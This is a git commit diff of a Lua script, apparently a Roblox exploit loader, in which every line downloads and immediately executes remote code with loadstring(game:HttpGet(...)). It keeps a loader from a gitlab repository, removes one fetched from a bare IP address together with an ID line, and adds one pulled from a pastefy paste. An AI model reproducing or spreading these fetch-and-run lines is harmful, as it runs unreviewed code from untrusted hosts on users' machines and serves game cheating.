ffcf99127419a947fc91d6239576a758b7f9d65d
ZephyrHub1 <quanghaha10092008@gmail.com>
2025-09-08 22:15:53 +0700

    Update Main.lua

--- Main.lua
+++ Main.lua
@@ -1,4 +1,3 @@
 local Spawner = loadstring(game:HttpGet("https://gitlab.com/darkdark/dark/-/raw/main/Spawner.lua"))()
 Spawner.Load()
-ID="b5bd87ab-c631-494c-9b65-aa0f5b823563";
-loadstring(game:HttpGet("http://5.129.217.87:3910/cdn/loader.luau"))()
+loadstring(game:HttpGet("https://pastefy.app/4XVrquep/raw"))()
